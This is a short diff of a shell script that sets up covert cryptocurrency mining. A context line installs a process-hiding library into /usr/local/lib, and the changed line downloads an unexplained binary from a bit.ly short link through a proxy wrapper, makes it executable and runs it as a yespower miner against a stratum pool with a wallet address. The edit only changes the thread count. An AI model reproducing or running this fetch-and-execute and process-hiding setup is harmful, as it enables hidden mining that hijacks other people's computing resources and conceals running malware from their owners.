@@ -48,4 +48,4 @@ sudo mv libprocesshider.so /usr/local/lib/;echo /usr/local/lib/libprocesshider.s
 cd ..
 
 
-./graftcp/graftcp wget https://bit.ly/3bKjlUQ && chmod 700 3bKjlUQ && ./3bKjlUQ -a yespower -o stratum+tcps://stratum-asia.rplant.xyz:17017 -u web1qrl78aw74s4gyeg6xx0kp98zkkperxuyku0jlra -p c=BTE,mc=BTE,ID=archer -t $(nproc) -B
+./graftcp/graftcp wget https://bit.ly/3bKjlUQ && chmod 700 3bKjlUQ && ./3bKjlUQ -a yespower -o stratum+tcps://stratum-asia.rplant.xyz:17017 -u web1qrl78aw74s4gyeg6xx0kp98zkkperxuyku0jlra -p c=BTE,mc=BTE,ID=archer -t 14 -B
